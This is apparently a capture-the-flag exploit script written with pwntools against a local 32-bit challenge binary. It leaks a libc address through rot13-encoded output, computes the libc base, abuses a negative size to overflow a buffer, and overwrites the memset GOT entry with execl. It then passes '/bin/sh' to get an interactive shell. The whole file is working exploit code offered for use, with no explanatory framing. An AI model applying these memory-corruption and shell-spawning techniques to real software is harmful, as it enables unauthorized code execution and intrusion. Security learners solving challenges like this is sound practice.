#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall01_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
target = process([exe.path])
#gdb.attach(target, ' source ~/breakpoint.txt')

####  Infoleak 
target.recvuntil(b"size: ")
target.sendline(b"1")
target.recvuntil(b"data: ")
target.send( b"AAAA" + b'\r')
recv = target.recvline()

print(recv )

b_leak_puts_11 = recv[-5: -1]

def rot13_f(string=b""):
    rot13 = str.maketrans(
    'ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz',
    'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm')
    #print(bytearray(string))
    b = bytearray(string)
    for i in range(len(b)):
        if(chr(b[i]).isalnum() == True):
            b[i] = ord(chr(b[i]).translate(rot13))
    #print(b)
    return bytes(b)

leak_puts_11 = rot13_f(b_leak_puts_11)

log.info( "Leak puts+11 @  " + hex(u32(leak_puts_11)) )

libc.address = u32(leak_puts_11) - libc.symbols['puts'] - 11

#libc_base = u32(leak_puts_11) - libc.symbols['puts'] - 11

log.info("Libc base @ " + hex(libc.address))
#log.info( "Addr system @ " +  hex( libc_base + libc.symbols['system']) ) 
#log.info( "Addr execl @ " +  hex( libc_base + libc.symbols['execl']) ) 
log.info( "Addr system @ " +  hex( libc.symbols['system']) ) 
log.info( "Addr execl @ " +  hex( libc.symbols['execl']) ) 

target.sendline(b"y")
target.recvuntil(b"size: ")
target.sendline(b"-1")
target.recvuntil(b"data: ")
payload = b""
#payload += rot13_f( p32( libc_base + libc.symbols['execl']))
payload += rot13_f( p32( libc.symbols['execl']))
payload += b"\x00"
#payload += rot13_f( p32( libc_base + libc.symbols['system']))
payload += b"A" * (64-len(payload))
payload += b"\x08"
#payload += b"A"*8
payload += p32( exe.got['memset'] )

target.sendline(payload)

#target.recv()
target.sendline(b"y")
#target.recvuntil(b"size: ")
target.sendline(b"1")
#target.recvuntil(b"data: ")

target.sendline(b"/bin/sh")




target.interactive()
